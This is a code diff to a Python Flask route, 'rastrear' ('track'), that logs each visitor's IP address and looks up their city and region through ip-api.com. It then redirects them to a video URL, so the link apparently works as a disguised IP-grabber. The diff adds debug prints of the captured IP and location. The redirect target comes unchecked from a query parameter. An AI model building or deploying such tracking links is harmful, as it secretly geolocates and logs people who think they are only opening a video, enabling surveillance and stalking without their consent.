@@ -33,14 +33,21 @@ def rastrear(link_id):
     video_url = request.args.get('v')
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
 
+    # Debug: Verificar se o IP está sendo capturado corretamente
+    print(f"IP Capturado: {ip}")
+
     try:
         resposta = requests.get(f"http://ip-api.com/json/{ip}")
         local = resposta.json()
         cidade = local.get('city', 'Cidade Desconhecida')
         regiao = local.get('regionName', 'Região Desconhecida')
-    except Exception:
+    except Exception as e:
+        print(f"Erro ao buscar localização: {e}")
         cidade = 'Cidade Desconhecida'
         regiao = 'Região Desconhecida'
+
+    # Debug: Verificar as variáveis de localização
+    print(f"Localização: {cidade}, {regiao}")
 
     log = {
         "data": str(datetime.now()),
@@ -61,6 +68,7 @@ def rastrear(link_id):
     with open(LOG_FILE, 'w') as f:
         json.dump(dados, f, indent=4)
 
+    # Redireciona para o link do vídeo
     return redirect(video_url)
 
 # API para retornar os logs
